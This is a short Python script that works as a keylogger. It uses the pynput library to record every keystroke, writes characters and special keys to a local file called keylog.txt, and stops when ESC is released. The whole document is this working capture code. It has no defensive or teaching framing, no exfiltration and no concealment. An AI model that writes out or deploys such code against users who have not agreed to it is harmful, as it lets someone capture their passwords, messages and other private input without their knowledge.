from pynput import keyboard

# Define the file where the key logs will be saved
log_file = "keylog.txt"

# Function to write keystrokes to the file
def write_to_file(key):
    with open(log_file, "a") as f:
        try:
            # Write the character of the key pressed
            f.write(key.char)
        except AttributeError:
            # Special keys (e.g., shift, ctrl, etc.) will raise an AttributeError
            # We can handle these differently if needed
            if key == key.space:
                f.write(" ")
            elif key == key.enter:
                f.write("\n")
            else:
                f.write(f" [{key}] ")

# Function called when a key is pressed
def on_press(key):
    write_to_file(key)

# Function called when a key is released
def on_release(key):
    # You can stop the listener if a specific key is released, for example, the ESC key
    if key == keyboard.Key.esc:
        return False

# Setting up the listener for key press and release events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
